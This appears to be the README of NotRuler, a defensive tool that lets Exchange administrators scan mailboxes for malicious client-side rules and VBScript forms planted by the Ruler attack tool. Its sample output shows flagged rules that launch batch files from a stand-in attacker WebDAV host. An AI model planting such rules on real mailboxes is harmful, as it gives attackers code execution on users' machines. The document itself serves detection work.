IntroductionIntroduction NotRuler is the opposite of Ruler. The tool aims to make life a little easier for Exchange Admins by allowing for the detection of both client-side rules and VBScript enabled forms. At a miminum this should allow for the detection of all attacks created through Ruler. NotRuler allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. What does it do?What does it do?

UsageUsage NotRuler has two modes of operation: - Rules -- check for client-side rules - Forms -- check for VBScript enabled forms - Homepage -- check for a custom homepage RulesRules The current version of NotRuler can check either a single or multiple mailboxes. These are supplied in the program arguments. To check multiple mailboxes, create a file with one account per line: john.ford@testdomain.com henry.hammond@testdomain.com james.smith@testdomain.com cindy.shell@testdomain.com Using the Exchange Admin account, you should be able to log into any mailbox on the Exchange server: ./notruler --username exchangeadmin --mailboxes /path/to/mailbox.list rules You can also check your own account by using --self ./notruler --username john.ford@testdomain.com --mailbox john.ford@testdomain.com --self rules Sample output: [+] Checking [john.ford@testdomain.com] [+] Found 5 rules [WARNING] Found client-side rule: [01000000d97851c4:pewpew3] Application: [\\myhost.somewhere.darkside.com\dav\morebad.bat] [WARNING] Found client-side rule: [01000000d97851b9:pewpew] Application: [\\myhost.somewhere.darkside.com\dav\bad.bat] [+] Checking [cindy.shell@testdomain.com] [+] No Rules Found [+] Checking [henry.hammond@testdomain.com] [+] No Rules Found [+] Checking [james.smith@testdomain.com] [+] No Rules Found FormsForms Same as with Rules, you need to either have a list of mailboxes or a single mailbox to check.
